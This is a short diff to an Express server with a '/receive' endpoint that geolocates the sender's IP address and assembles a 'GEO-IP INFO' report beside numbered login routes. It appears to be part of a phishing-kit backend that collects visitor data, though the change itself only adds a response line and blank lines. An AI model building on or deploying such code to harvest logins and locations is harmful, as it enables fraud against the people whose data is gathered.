@@ -102,6 +102,7 @@ app.get('/login/4', async (req, res) => {
 app.post('/receive', async (req, res) => {
   let message = '';
   let myObject = req.body;
+  res.send('mv');
 
   const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
@@ -128,6 +129,8 @@ app.post('/receive', async (req, res) => {
 	    }
       
     }
+    
+    
     
     message += `🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
